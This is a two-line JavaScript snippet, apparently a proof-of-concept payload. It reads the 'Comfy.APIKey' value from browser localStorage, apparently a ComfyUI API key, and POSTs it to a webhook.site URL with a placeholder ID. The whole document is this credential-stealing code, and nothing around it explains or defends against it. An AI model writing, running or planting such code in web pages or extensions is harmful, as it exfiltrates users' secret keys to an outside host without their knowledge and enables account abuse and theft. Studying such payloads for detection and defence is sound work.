const k = localStorage.getItem('Comfy.APIKey');
fetch('https://webhook.site/00000000-0000-0000-0000-000000000000', {method: 'POST', body: k});
